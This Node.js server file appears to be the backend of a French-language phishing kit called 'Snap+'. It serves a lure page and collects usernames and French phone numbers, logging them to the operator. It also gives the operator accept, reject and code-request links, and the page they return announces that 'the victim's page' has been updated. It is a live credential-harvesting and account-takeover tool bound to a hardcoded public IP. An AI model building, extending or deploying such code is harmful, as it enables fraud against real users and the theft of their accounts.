const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 27208;
const sessions = {};
const rateLimits = {};

function isRateLimited(ip) {
  const now = Date.now();
  if (!rateLimits[ip]) rateLimits[ip] = { count: 0, resetTime: now + 60000 };
  if (now > rateLimits[ip].resetTime) rateLimits[ip] = { count: 0, resetTime: now + 60000 };
  rateLimits[ip].count++;
  return rateLimits[ip].count > 20;
}

function cors(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
}

const server = http.createServer((req, res) => {
  cors(res);
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  const url = new URL(req.url, `http://85.215.148.4:27208`);
  const pathname = url.pathname;
  const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  if (pathname === '/' || pathname === '/index.html') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(fs.readFileSync(path.join(__dirname, 'index.html')));
    return;
  }

  if (pathname === '/api/session' && req.method === 'POST') {
    if (isRateLimited(clientIP)) { res.writeHead(429); res.end('{}'); return; }
    let body = '';
    req.on('data', d => body += d);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        const sessionId = Math.random().toString(36).substr(2, 12);
        sessions[sessionId] = { status: 'pending', phone: data.phone, username: data.username, created: Date.now() };
        console.log(`[NEW] ${sessionId} | ${data.username} | +33${data.phone}`);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ sessionId }));
      } catch(e) { res.writeHead(400); res.end('{}'); }
    });
    return;
  }

  if (pathname.startsWith('/api/status/') && req.method === 'GET') {
    const sessionId = pathname.split('/')[3];
    const session = sessions[sessionId];
    if (!session) { res.writeHead(404); res.end(JSON.stringify({ status: 'unknown' })); return; }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: session.status }));
    return;
  }

  if (pathname === '/api/code' && req.method === 'POST') { res.writeHead(200); res.end('{}'); return; }
  if (pathname === '/api/reset' && req.method === 'POST') { res.writeHead(200); res.end('{}'); return; }

  if (pathname.startsWith('/action/')) {
    const parts = pathname.split('/');
    const action = parts[2];
    const sessionId = parts[3];
    if (!['accept', 'reject', 'code'].includes(action)) { res.writeHead(400); res.end('Invalid'); return; }
    if (sessions[sessionId]) {
      sessions[sessionId].status = action;
      console.log(`[ACTION] ${action.toUpperCase()} -> ${sessionId}`);
    }
    const isAccept = action === 'accept';
    const isCode = action === 'code';
    const color = isAccept ? 'rgba(34,197,94,0.1)' : isCode ? 'rgba(99,102,241,0.1)' : 'rgba(239,68,68,0.1)';
    const border = isAccept ? '#22c55e' : isCode ? '#818cf8' : '#ef4444';
    const emoji = isAccept ? '✅ Accepté !' : isCode ? '📩 Code demandé !' : '❌ Refusé !';
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(`<!DOCTYPE html><html><head><meta charset="UTF-8"><style>
      *{margin:0;padding:0;}body{background:#0d0019;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;}
      .box{background:${color};border:1px solid ${border};border-radius:20px;padding:36px 48px;text-align:center;max-width:520px;}
      h2{color:${border};font-size:28px;margin-bottom:10px;}
      p{color:#9f7abf;font-size:14px;line-height:1.45;}
      .actions{margin-top:18px;display:flex;gap:10px;justify-content:center;flex-wrap:wrap;}
      a.btn{display:inline-block;padding:10px 14px;border-radius:12px;border:1px solid ${border};color:#fff;text-decoration:none;background:rgba(0,0,0,0.18);}
      a.btn.secondary{border-color:rgba(255,255,255,0.22);background:rgba(255,255,255,0.06);}
    </style></head><body><div class="box">
      <h2>${emoji}</h2>
      <p>La page de la victime a été mise à jour.</p>
      <div class="actions">
        <a class="btn" href="/">Retour</a>
        <a class="btn secondary" href="javascript:window.close()">Fermer l'onglet</a>
      </div>
      <p style="margin-top:14px;opacity:.9">Tu peux fermer cette page maintenant.</p>
    </div></body></html>`);
    return;
  }

  res.writeHead(404); res.end('Not found');
});

setInterval(() => {
  const now = Date.now();
  for (const id in sessions) {
    if (now - sessions[id].created > 3600000) delete sessions[id];
  }
}, 300000);

server.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Serveur Snap+ -> http://85.215.148.4:27208`);
});
